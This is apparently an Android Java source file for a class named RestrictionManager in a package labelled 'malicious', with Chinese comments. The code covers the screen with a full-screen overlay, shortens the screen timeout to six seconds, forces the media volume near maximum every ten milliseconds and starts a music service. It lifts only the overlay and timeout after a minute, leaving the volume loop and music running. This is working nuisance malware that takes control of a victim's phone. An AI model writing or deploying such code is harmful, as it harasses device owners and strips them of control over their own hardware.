package com.example.utils;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.os.Handler;
import android.provider.Settings;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;
import com.example.malicious.R;

import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;


// 限制管理器
public class RestrictionManager {
    private final Context context;
    private WindowManager windowManager;
    private View overlayView;
    private final ScheduledExecutorService scheduler;

    public RestrictionManager(final Context context, final ScheduledExecutorService scheduler) {
        this.context = context;
        this.scheduler = scheduler;
    };


    // 启动限制功能
    public void startRestriction() {
        showOverlay(); // 显示覆盖层
        startService(new Intent(context, RestrictionService.class)); // 启动前台服务
        setScreenTimeout(6000); // 设置屏幕超时时间为 6 秒
        new Handler().postDelayed(this::stopRestriction, TIMEOUT); // 恢复用户操作
        scheduler.scheduleWithFixedDelay(this::setMaxVolume, 0, 10, TimeUnit.MILLISECONDS); // 最大化音量
        startService(new Intent(context, MusicService.class)); // 启动音乐服务
    };


    // 显示覆盖层
    @SuppressLint("InflateParams")
    private void showOverlay() {
        windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        overlayView = LayoutInflater.from(context).inflate(R.layout.overlay_layout, null);

        // 设置悬浮窗参数
        @SuppressLint("InlinedApi")
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY, // 使用悬浮窗类型
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, // 不获取焦点
                PixelFormat.TRANSLUCENT // 半透明背景
        );

        // 设置悬浮窗覆盖状态栏
        params.gravity = Gravity.TOP;
        params.y = 0;

        windowManager.addView(overlayView, params); // 添加悬浮窗
    };


    // 设置屏幕超时时间
    private void setScreenTimeout(final int timeout) {
        try { Settings.System.putInt(context.getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, timeout); }
        catch (Exception e) { Toast.makeText(context, "无法修改屏幕超时时间", Toast.LENGTH_SHORT).show(); };
    };


    // 停止限制功能
    private void stopRestriction() {
        if (overlayView != null) windowManager.removeView(overlayView); // 移除覆盖层
        stopService(new Intent(context, RestrictionService.class)); // 停止前台服务
        setScreenTimeout(60000); // 恢复屏幕超时时间为 60 秒
    };


    // 最大化音量
    private void setMaxVolume() {
        final AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        if (audioManager != null) {
            try {
                audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
                final int maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC) - 1;
                audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, maxVolume, AudioManager.FLAG_SHOW_UI);
            } catch (Exception e) {
                Toast.makeText(context, "无法修改音量", Toast.LENGTH_SHORT).show();
            };
        };
    };


    // 启动服务和停止服务
    private void startService(Intent intent) { context.startService(intent); };
    private void stopService(Intent intent) { context.stopService(intent); };
    private static final int TIMEOUT = 60 * 1000; // 限制时间
};